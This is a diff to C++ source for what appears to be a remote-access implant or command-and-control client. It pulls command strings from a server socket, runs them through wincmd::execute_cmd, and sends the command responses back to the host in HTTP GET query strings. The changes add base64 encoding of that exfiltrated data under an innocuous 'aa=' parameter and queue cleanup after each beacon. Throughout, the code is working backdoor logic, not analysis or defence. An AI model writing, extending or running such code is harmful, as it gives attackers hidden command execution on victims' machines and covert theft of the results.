@@ -72,38 +72,41 @@ std::string createCookiesString() {
 }
 
 std::string buildRequest(const std::string& path, const std::string& host, const std::string& cookies, CommandQueue& queue) {
-    // Check if the queue is not empty
+    
     if (!queue.empty()) {
-        // Access the first element in the map
+        
         auto it = queue.begin();
-        // Access the command info
+       
         auto& cmdqueue = it->second;
-        // Access cmdValue, cmdString, cmdResponse
+        
         std::string cmdGroup = cmdqueue.cmdGroup;
         std::string cmdString = cmdqueue.cmdString;
         std::string cmdResponse = cmdqueue.cmdResponse;
 
         std::string cookiesString = createCookiesString(); // Assuming this function is defined
         std::string queryParams = "cmdValue=" + cmdGroup + "&cmdString=" + cmdString + "&cmdResponse=" + cmdResponse;
+        std::string encodedParams = base64_encode(queryParams);
+        
+        std::cout << "Params: " << encodedParams << std::endl;
 
-        std::cout << "Params: " << queryParams << std::endl;
-
-        return "GET /" + path + "?" + queryParams + " HTTP/1.1\r\n"
+        removeFromQueue(queue, it->first); // Passing the key to removeFromQueue
+    
+        return "GET /" + path + "?" + "aa=" + encodedParams + " HTTP/1.1\r\n"
                "Host: " + host + "\r\n"
                "Connection: Keep-Alive\r\n"
-               "Keep-Alive: timeout=15, max=1000\r\n" // add \r\n at the end
-               "Cookie: " + cookiesString + "\r\n"    // add \r\n at the end
-               "\r\n";
+               "Keep-Alive: timeout=15, max=1000\r\n" 
+               "Cookie: " + cookiesString + "\r\n"    
+               "\r\n"; 
         
     } else {
         // Queue is empty, return request without command information
         std::cout << "Empty queue" << std::endl;
-        std::string cookiesString = createCookiesString(); // Assuming this function is defined
+        std::string cookiesString = createCookiesString(); 
         return "GET /" + path + "?" + " HTTP/1.1\r\n"
                "Host: " + host + "\r\n"
                "Connection: Keep-Alive\r\n"
-               "Keep-Alive: timeout=15, max=1000\r\n" // add \r\n at the end
-               "Cookie: " + cookiesString + "\r\n"    // add \r\n at the end
+               "Keep-Alive: timeout=15, max=1000\r\n" 
+               "Cookie: " + cookiesString + "\r\n"    
                "\r\n";
     }
 }
@@ -208,6 +211,28 @@ void removeFromQueue(CommandQueue& queue, int key) {
     queue.erase(key);  // Remove command from the queue with the specified key
 }
 
+std::string base64_encode(const std::string &in) {
+    std::string out;
+    int len = in.length();
+    int j = 0;
+    const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+    for (int i = 0; i < len; i += 3) {
+        int octet_a = in[i];
+        int octet_b = i + 1 < len ? in[i + 1] : 0;
+        int octet_c = i + 2 < len ? in[i + 2] : 0;
+
+        int triplet = (octet_a << 16) + (octet_b << 8) + octet_c;
+
+        out += base64_chars[(triplet >> 18) & 0x3F];
+        out += base64_chars[(triplet >> 12) & 0x3F];
+        out += i + 1 < len ? base64_chars[(triplet >> 6) & 0x3F] : '=';
+        out += i + 2 < len ? base64_chars[triplet & 0x3F] : '=';
+    }
+
+    return out;
+}
+
 bool extract_content_length(const std::vector<char>& data, size_t& content_length) {
     // Search for the Content-Length header
     const std::string content_length_header = "Content-Length:";
@@ -263,13 +288,13 @@ std::vector<char> receive_data(SOCKET ConnectSocket) {
         }
     } while (bytesReceived == BUFFER_SIZE);
 
-    if (!cmdString.empty()) {
+    if (cmdString.length() >= 1) {
         addToQueue(queue, key, cmdGroup, cmdString, cmdResponse);
         wincmd::execute_cmd(queue, wincmd::current_dir, wincmd::time_out);  
     } else {
         std::cerr << "Received empty command" << std::endl;
     }
-
+    cmdString.clear();
     return buffer;
 }
 
